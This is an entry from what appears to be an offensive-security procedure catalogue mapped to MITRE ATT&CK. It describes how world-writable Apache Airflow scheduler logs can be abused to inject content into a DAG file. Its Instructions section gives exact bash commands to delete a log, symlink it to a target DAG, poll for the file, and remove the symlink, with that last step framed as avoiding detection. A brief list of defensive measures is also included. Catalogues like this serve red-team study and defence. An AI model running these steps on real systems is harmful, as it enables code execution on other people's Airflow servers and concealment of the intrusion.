---
tags:
  - symlink
  - logs
  - injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/rm-log-file]]'
  - '[[commands/ln-symlink-to-dag]]'
  - '[[commands/wait-for-poc-file]]'
  - '[[commands/rm-symlink]]'
verified: false
platforms:
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Hijack Execution Flow]]'
updated_at: '2025-12-14T17:29:09.510Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
id: 9d602d04-795b-4d6e-a62e-55da6a4a78e8
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Hijack Execution Flow]]'
---
# Create-Symlink-in-Scheduler-Logs

## Summary

This procedure removes an existing log file, creates a symlink from it to a target DAG file, waits for accessibility, and cleans up, exploiting world-writability to bridge logs and DAGs directories.

## Description

Due to umask 0, Airflow log files like example_bash_operator.py.log are world-writable. By symlinking this log to a DAG file (poc.py), attackers can write to the DAG when the scheduler appends to the log. This hijacks DAG processing. Target environment: Airflow logs directory. Prerequisites: From Step 1, in logs dir with umask 0. Expected outcomes: Symlink enables indirect DAG write; cleanup avoids detection.

## Requirements

1. World-writable logs directory from prior umask setting
2. $TARGET variable set
3. Airflow scheduler generating logs periodically

## Defense

Defensive measures and detection strategies:

- Implement strict umask 0022 and chown logs to airflow user only
- Use AppArmor/SELinux to restrict symlink creation in logs paths
- Log and alert on symlink operations in sensitive directories via filesystem monitoring

## Objectives

1. Clear path for symlink by removing existing file
2. Establish link between log and DAG for content injection
3. Ensure target is ready before proceeding
4. Remove evidence post-setup

## Instructions

### Step 1: Remove Existing Log File

**Context**: Deletes the target log to allow symlink in its place.

**Command** ([[commands/rm-log-file]]):
```bash
rm example_bash_operator.py.log
```

> Removes the file. Expected output: No output if successful.

### Step 2: Create Symlink

**Context**: Links log name to DAG file, exploiting writability.

**Command** ([[commands/ln-symlink-to-dag]]):
```bash
ln -s $TARGET/dags/poc.py example_bash_operator.py.log
```

> Creates symbolic link. Expected output: No output.

### Step 3: Wait for Target File

**Context**: Polls until poc.py is created/writable by scheduler.

**Command** ([[commands/wait-for-poc-file]]):
```bash
until [ -f $TARGET/dags/poc.py ]; do sleep 1; done
```

> Loops with 1s sleeps. Expected output: Exits when file exists.

### Step 4: Clean Up Symlink

**Context**: Removes symlink to prevent interference.

**Command** ([[commands/rm-symlink]]):
```bash
rm example_bash_operator.py.log
```

> Deletes the link. Expected output: No output.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Hijack Execution Flow]] Hijack Execution Flow

### Sub-Techniques

- None

## Commands Used

- [[commands/rm-log-file]]
- [[commands/ln-symlink-to-dag]]
- [[commands/wait-for-poc-file]]
- [[commands/rm-symlink]]

## Tools Used

- None

## Tags

- [[symlink]]
- [[logs]]
- [[injection]]
